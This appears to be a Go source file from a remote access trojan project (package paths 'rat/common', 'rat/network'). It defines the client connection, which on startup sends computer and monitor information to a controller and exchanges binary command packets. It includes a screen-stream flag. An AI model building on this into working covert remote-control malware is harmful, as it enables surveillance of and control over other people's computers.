package main

import (
	"encoding/binary"
	"fmt"
	"net"
	"rat/common"
	"rat/network"
)

type Connection struct {
	net.Conn
	network.Writer
	network.Reader
}

var Queue chan OutgoingPacket

func (c *Connection) Init() {
	Queue <- &ComputerInfoPacket{}
	Queue <- &MonitorsPacket{}
}

func (c *Connection) Close() {
	screenStream = false

	c.Conn.Close()
}

func (c *Connection) ReadHeader() (common.PacketHeader, error) {
	var h common.PacketHeader
	err := binary.Read(c, common.ByteOrder, &h)

	return h, err
}

func (c *Connection) WriteHeader(header common.PacketHeader) error {
	return binary.Write(c.Conn, common.ByteOrder, header)
}

func (c *Connection) WritePacket(packet OutgoingPacket) error {
	err := c.WriteHeader(packet.Header())

	if packet.Header() == common.ComputerInfoHeader {
		fmt.Println("Outside init()", packet)
	}
	if err != nil {
		return err
	}

	return c.Writer.WritePacket(packet)
}

type IncomingPacket interface {
	OnReceive() error
}

type OutgoingPacket interface {
	Init()
	Header() common.PacketHeader
}

func (c Connection) ReadPacket() (IncomingPacket, error) {
	header, _ := c.ReadHeader()
	packet := GetIncomingPacket(header)
	fmt.Println("Received header", header)

	e, err := network.Deserialize(c.Reader, packet)
	if err != nil {
		return nil, err
	}

	return e.(IncomingPacket), e.(IncomingPacket).OnReceive()
}
